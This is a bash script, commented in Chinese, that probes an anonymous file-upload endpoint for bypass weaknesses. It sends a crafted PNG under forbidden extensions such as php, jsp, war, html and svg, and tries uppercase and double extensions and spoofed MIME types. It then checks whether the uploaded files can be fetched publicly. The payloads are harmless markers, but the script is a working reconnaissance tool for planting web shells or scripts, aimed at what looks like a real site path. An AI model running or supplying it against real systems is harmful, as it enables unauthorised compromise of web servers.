#!/bin/bash
# upload_matrix_probe.sh — 匿名上传点「扩展名白名单 / MIME 是否参与 / 是否落地可访问」三步定性
# 用法: ./upload_matrix_probe.sh https://TARGET/yinyuan11/file/uploadFile [business] [type]
# 产出: 每个变体一行 http 码 + 响应片段；成功时打印落地路径与匿名取回验证（状态码+Content-Type+字节数）
set -u
# ---- 参数检查 ----
if [ $# -lt 1 ]; then printf '用法: ./upload_matrix_probe.sh <https://TARGET/upload>\n' >&2; exit 1; fi
U="${1:?usage: $0 <upload_url> [business] [type]}"
BIZ="${2:-PHOTO}"; TYP="${3:-IMAGE}"
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
TS=$(date +%s); D=$(mktemp -d); cd "$D" || exit 1

# 1) 造一张结构合法的最小 PNG（不依赖 PIL / ImageMagick）
python3 - "$D" <<'PY'
import zlib,struct,sys,os
d=sys.argv[1]
def ck(t,data):
    c=t+data; return struct.pack('>I',len(data))+c+struct.pack('>I',zlib.crc32(c)&0xffffffff)
w=h=16
rows=b''
for y in range(h):
    rows+=b'\x00'+bytes([(x*17)%256 for x in range(w) for _ in range(3)])
png=b'\x89PNG\r\n\x1a\n'+ck(b'IHDR',struct.pack('>IIBBBBB',w,h,8,2,0,0,0))+ck(b'IDAT',zlib.compress(rows,9))+ck(b'IEND',b'')
open(os.path.join(d,'valid.png'),'wb').write(png)
print('[i] valid.png',len(png),'bytes')
PY

up() { # name ext ctype body
  local name="$1" ext="$2" ct="$3" body="$4"
  local r
  r=$(curl -sS -m 30 -A "$UA" -X POST "$U" \
        -F "business=$BIZ" -F "type=$TYP" \
        -F "file=@$body;filename=$name.$ext;type=$ct" \
        -w '|%{http_code}|%{size_download}')
  echo "[$ext/$ct] $r"
  echo "$r" | grep -o '/IMAGE/[^"]*' | head -1
}

echo '--- 基线：合法 PNG ---'
LAND=$(up "probe$TS" png image/png valid.png | tail -1)
echo "landed=${LAND:-<none>}"

echo '--- 非法 PNG（只有签名+文本）：区分「解码失败」与「存储不通」 ---'
printf '\x89PNG\r\n\x1a\n%s\n' "marker-$TS" > bad.png
up "bad$TS" png image/png bad.png

echo '--- 扩展名白名单（内容一律合法 PNG，单变量） ---'
for e in txt html svg js jsp php war; do up "probe$TS" "$e" image/png valid.png >/dev/null; done
echo '--- 大写扩展名 ---'
up "probe$TS" PNG image/png valid.png >/dev/null
up "probe$TS" HTML image/png valid.png >/dev/null
echo '--- 双扩展名（按最后一段判?） ---'
up "probe$TS" png.html image/png valid.png >/dev/null
echo '--- MIME 伪造（.php 内容仍是文本，仅换 MIME） ---'
printf 'marker-%s\n' "$TS" > m.txt
up "probe$TS" php image/png m.txt >/dev/null

echo '--- 落地文件匿名取回 + 路径对照 ---'
if [ -n "${LAND:-}" ]; then
  BASE=$(echo "$U" | sed -E 's#(/[^/]+/)?[^/]+$##')
  for p in "${BASE}/file/11yyUpload${LAND}" "$(echo "$U"|sed -E 's#/[^/]+$##' | sed -E 's#/[^/]+$##')${LAND}"; do
    echo "GET $p"
    curl -sS -m 20 -A "$UA" -o /dev/null -D - "$p" 2>&1 | grep -iE 'HTTP/|content-type|content-length|x-content-type'
  done
fi
